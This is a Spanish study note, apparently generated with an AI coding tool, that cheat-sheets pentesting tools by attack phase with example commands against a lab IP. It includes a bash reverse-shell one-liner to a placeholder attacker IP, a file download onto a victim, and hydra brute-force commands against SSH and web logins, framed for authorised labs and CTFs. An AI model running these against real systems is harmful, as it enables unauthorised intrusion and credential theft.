---
title: Herramientas de ciberseguridad en detalle
date: 2026-06-14
tags: [ciberseguridad, programacion/seguridad, herramientas, pentesting]
type: nota
status: en-progreso
source: claude-code
aliases: [herramientas ciberseguridad, chuleta pentesting, tools pentest, nmap gobuster hydra]
---

# Herramientas de ciberseguridad en detalle

## Idea central
Las herramientas **no son magia**: cada una **automatiza una tarea** de una **fase** del ataque
(recon → enumeración → explotación → post-explotación/privesc). Si entiendes la tarea, la herramienta
es solo "el cómo" — y los flags se consultan con `man <tool>` o `<tool> -h`. Casi todas vienen
preinstaladas en **Kali** (por eso los vídeos las tienen todas). Mapéalas a [[07-pentesting-y-ciclo-del-ataque]].

> Solo en tus sistemas, labs o CTFs / con autorización. Aquí se explican para **entender y defender**.

## Tabla resumen (herramienta → fase → para qué)
| Herramienta | Fase | Para qué |
|---|---|---|
| nmap | Recon | Puertos abiertos + servicios/versiones |
| gobuster / ffuf | Enum web | Rutas/archivos ocultos en un sitio |
| nikto, whatweb | Enum web | Vulns conocidas y tecnología del sitio |
| curl / Burp Suite | Enum/explot web | Peticiones HTTP manuales / interceptar y editar |
| hydra | Credenciales | Fuerza bruta de login (online) |
| john / hashcat | Credenciales | Crackear hashes (offline) |
| searchsploit / Metasploit | Explotación | Buscar/lanzar exploits conocidos |
| netcat (nc) | Explotación/acceso | Conexiones, listeners, reverse shells |
| LinPEAS / GTFOBins | Privesc | Encontrar/abusar caminos a root |
| Wireshark / tcpdump | Análisis red | Capturar y leer tráfico |

---

## Recon — nmap
**Qué hace**: escanea una IP y dice qué **puertos** están abiertos y qué **servicio/versión** corre.
**Cómo funciona**: envía paquetes a los puertos y observa las respuestas.
```bash
nmap -sV -sC 10.10.10.5        # versión de servicios (-sV) + scripts básicos (-sC)
nmap -p- 10.10.10.5            # TODOS los 65535 puertos
nmap -sS -T4 10.10.10.5        # SYN scan, más rápido
nmap -A 10.10.10.5            # agresivo (versión + OS + scripts + traceroute)
```
Lee la salida: puerto → servicio → versión (la versión es clave para buscar exploits).

## Enumeración web
### gobuster / ffuf / feroxbuster — rutas ocultas
**Qué hacen**: prueban una **wordlist** de rutas contra el servidor y reportan las que existen (por código de estado).
```bash
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
### nikto / whatweb — vulns y tecnología
```bash
nikto -h http://10.10.10.5     # busca configuraciones inseguras y vulns conocidas
whatweb http://10.10.10.5      # CMS, servidor, frameworks (fingerprint)
```
### curl — peticiones a mano (insustituible)
```bash
curl -i http://10.10.10.5/robots.txt        # ver contenido + cabeceras
curl -s http://10.10.10.5 | grep -i -E 'user|pass|comment'   # buscar pistas en el HTML
curl -X POST -d 'user=admin&pass=admin' http://10.10.10.5/login.php
```
### Burp Suite — proxy de interceptación
**Qué hace**: se pone **entre tu navegador y la web**; capturas una petición, la **editas** y la reenvías.
- **Proxy**: intercepta el tráfico. **Repeater**: reenvías una petición modificándola. **Intruder**: automatizas variaciones (fuzzing de parámetros).
- Uso: configura el navegador para usar el proxy de Burp (127.0.0.1:8080) y empieza a interceptar. Imprescindible para SQLi/XSS de [[04-seguridad-web-owasp]].

## Credenciales
### hydra — fuerza bruta online
**Qué hace**: prueba muchas contraseñas contra un **servicio en vivo** (SSH, FTP, login web).
```bash
hydra -l rick -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"
```
### john / hashcat — crackear hashes (offline)
**Qué hacen**: dado un **hash** capturado, prueban contraseñas hasta que coincide.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt rockyou.txt    # -m 0 = MD5 (cada tipo de hash tiene su modo)
```
### Wordlists
Listas que usan las herramientas de arriba. Viven en `/usr/share/wordlists/`. Las clave:
**`rockyou.txt`** (contraseñas filtradas) y **SecLists** (rutas, usuarios, payloads, de todo).

## Explotación / acceso
### searchsploit / Metasploit
```bash
searchsploit apache 2.4        # busca exploits conocidos (Exploit-DB local) por servicio/versión
msfconsole                     # framework: search <vuln> -> use <módulo> -> set RHOSTS -> exploit
```
### netcat (nc) — la navaja suiza
**Qué hace**: abre conexiones TCP/UDP crudas. Su uso estrella: **reverse shell** (la víctima te devuelve una terminal).
```bash
nc -lvnp 4444                  # en TU máquina: escuchar en el puerto 4444
# en la víctima (vía RCE): bash -i >& /dev/tcp/TU_IP/4444 0>&1   -> te llega la shell
```

## Post-explotación / escalada de privilegios
```bash
sudo -l                        # ¿qué puedo ejecutar como root? (ruta típica de privesc)
id ; whoami ; uname -a         # quién soy y qué sistema
```
- **LinPEAS** (script): automatiza la búsqueda de fallos para subir a root (`./linpeas.sh`). En Windows: **WinPEAS**.
- **GTFOBins** (gtfobins.github.io): dado un binario con permisos sudo/SUID, te dice **cómo abusarlo** para escalar. Referencia obligada.
- Transferir archivos a la víctima: en tu máquina `python3 -m http.server 8000`, en la víctima `wget http://TU_IP:8000/linpeas.sh`.

## Análisis de red — Wireshark / tcpdump
**Qué hacen**: **capturan y muestran el tráfico** de red paquete a paquete.
```bash
sudo tcpdump -i eth0 -w captura.pcap     # capturar a archivo (CLI)
# Wireshark: abre el .pcap y filtra (http, ip.addr==10.10.10.5, tcp.port==80)
```
Útil para ver credenciales en texto plano, entender un protocolo, depurar. (Ver [[03-seguridad-de-redes]].)

## Cómo aprenderlas (sin memorizar)
1. Entiende la **fase/tarea**; la herramienta es secundaria.
2. Flags → `man <tool>` o `<tool> -h`. No los memorices.
3. **Salas dedicadas en TryHackMe** ("Nmap", "Gobuster", "Hydra", "Burp Suite", "Metasploit") — una herramienta a fondo cada una.
4. **HackTricks** (book.hacktricks.xyz) como referencia de "cómo hago X". **GTFOBins** y **PayloadsAllTheThings** para privesc/payloads.
5. Practica repitiendo en máquinas (Pickle Rick y siguientes).

## Conexiones
- [[MOC_Ciberseguridad]]
- [[07-pentesting-y-ciclo-del-ataque]] — la fase de cada herramienta
- [[03-seguridad-de-redes]] — nmap/Wireshark en contexto · [[04-seguridad-web-owasp]] — Burp/curl
- [[06-seguridad-de-sistemas-y-hardening]] — privesc · [[12-aprender-y-carrera]] — labs y práctica
